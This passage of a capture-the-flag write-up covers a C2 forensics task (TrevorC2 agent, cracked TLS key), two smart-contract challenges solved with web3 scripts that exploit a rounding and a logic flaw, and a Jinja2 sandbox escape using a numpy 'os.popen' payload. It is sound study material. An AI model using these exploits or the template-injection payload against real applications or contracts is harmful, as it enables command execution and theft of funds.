    *   `tshark` showed high traffic from `192.168.56.104` (Attacker).
    *   HTTP traffic to port 3000 contained a Next.js Server Action exploit (CVE-2025-55182).
2.  **C2 Analysis**:
    *   HTTPS traffic on port 4433 contained the C2 communication.
    *   We extracted the weak server certificate, cracked the RSA private key, and decrypted the TLS traffic.
3.  **Malware Analysis**:
    *   The decrypted traffic contained a python script `a.py`.
    *   Deobfuscating `a.py` (32 layers of zlib/base64) revealed the TrevorC2 agent and its cipher key `aa34042ac9c17b459b93c0d49c7124ea`.
4.  **Command Decryption**:
    *   Using the key, we decrypted the C2 commands hidden in HTML comments, revealing the persistence mechanism (SSH key addition).

**Flag**
`C2C{r34C725h3Ll_f0r_7H3_W1n_8995bba8e58d}`

---

## Blockchain

### Nexus

**Challenge Description**
Smart contract challenge. 
**Vulnerability**: Integer division error in `essenceTocrystal` where huge `amplitude` results in 0 cost.

**Solution Code**
```python
import os
import json
from web3 import Web3

RPC_URL = "http://challenges.1pc.tf:31123/..."
PLAYER_KEY = "..."

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    account = w3.eth.account.from_key(PLAYER_KEY)
    
    nexus.functions.attune(1).transact({'from': account.address})
    bal = essence.functions.balanceOf(account.address).call()
    essence.functions.transfer(nexus_addr, bal).transact({'from': account.address})
    setup.functions.conductRituals().transact({'from': account.address})
    
    my_crystals = nexus.functions.crystalBalance(account.address).call()
    nexus.functions.dissolve(my_crystals, account.address).transact({'from': account.address})
    nexus.functions.attune(1).transact({'from': account.address})
    my_crystals = nexus.functions.crystalBalance(account.address).call()
    nexus.functions.dissolve(my_crystals, account.address).transact({'from': account.address})

if __name__ == "__main__":
    main()
```

**Flag**
`C2C{the_essence_of_nexus_is_donation_hahahaha}`

---

### TGE

**Challenge Description**
Solidity challenge to reach Tier 3.
**Vulnerability**: Logic flaw in `setTgePeriod` allowing a late snapshot reset via `enableTge(false)`.

**Solution Code**
```python
from web3 import Web3

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    
    token_contract.functions.approve(tge_addr, 15).transact()
    tge_contract.functions.buy().transact()
    
    setup_contract.functions.enableTge(False).transact()
    setup_contract.functions.enableTge(True).transact()
    
    tge_contract.functions.upgrade(2).transact()
    tge_contract.functions.upgrade(3).transact()
    
    print(f"Is Solved: {setup_contract.functions.isSolved().call()}")

if __name__ == "__main__":
    main()
```

**Flag**
`C2C{just_a_warmup_from_someone_who_barely_warms_up}`

---

## Misc

### Jin

**Challenge Description**
A Python web app utilizing Jinja2 `SandboxedEnvironment`. It has a strict WAF but exposes the `numpy` library.

**Vulnerability Analysis**
The WAF blocks keywords like `import`, `eval`. However, it allows `numpy`.
Jinja2's `~` operator concatenates strings. We can construct malicious payloads character-by-character using string representations of numpy objects.

**Solution Code**
```python
from pwn import *

HOST = 'challenges.1pc.tf'
PORT = 32702

p = remote(HOST, PORT)
p.recvuntil(b'>>> ')
content = b"""{%set x= numpy.fix~numpy.typing~dict(help=1)%}{{x}}"""
p.sendline(content)
result = p.recvline().decode()

# Construct payload using indices from result
# content = ... {{numpy.f2py.os.popen('cat flag.txt').read()}}
content = b"{%set x= numpy.fix~numpy.typing~dict(help=1)%}{{numpy.f2py.os.popen('cat flag.txt').read()}}"
p.sendline(content)
print(p.recvline().decode())
```

**Flag**
`C2C{damnnn_i_love_numpy_6447e4b64e5e}`
{% endraw %}